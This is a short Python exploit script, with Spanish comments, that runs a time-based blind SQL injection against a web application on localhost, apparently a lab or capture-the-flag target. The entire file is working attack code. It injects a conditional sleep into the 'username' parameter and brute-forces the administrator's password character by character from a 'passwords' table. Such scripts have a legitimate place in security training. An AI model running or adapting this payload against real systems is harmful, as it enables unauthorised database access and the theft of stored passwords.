#!/usr/bin/python3

import requests, time
from pwn import *

url = "http://localhost:1234/index.php"

p1 = log.progress("SQLi blind")
session = requests.Session()

dic_letters = "abcdefghijklmnopqrstuvwxyz0123456789.+!$#-_<>~}:\"\'{*][%,&/\)(=ABCDEFGHIJKLMNOPQRSTUVWXYZ"
result = ""

# Aca depende de que columna queremos sacar de X tabla, en este caso la columna "password"
p2 = log.progress("Password")
# Pueda que la contraseña (aveces) sea larga asi que se lo indicamos para que haga de cuenta que hay 69 caracteres, empezando desde el 1
for position in range(1, 70):
    for letter in dic_letters:
        # Tiempo antes de la peticion
        time_now = time.time()

        # Le indicamos la columna X de la tabla "passwords" donde el usuario sea "administrator" y que valide X letra en N posicion
        payload = "?method=select&"
        payload += "username=administrator' and if(substr((SELECT BINARY password FROM passwords WHERE account='administrator'),%d,1)='%s',sleep(3),1) and '1'='1&" % (position, letter)
        payload += "table=passwords"

        p1.status(payload)
        r = session.get(url + payload)

        # Tiempo despues de la peticion
        time_after = time.time()

        # Si el tiempo de diferencia es mayor a 2, sabemos que hablo con la base de datos, por lo tanto nos quedamos con la letra
        if time_after - time_now > 2:
            result += letter
            p2.status(result)
            break

p2.success(result)
result = ""

p1.success("Done")
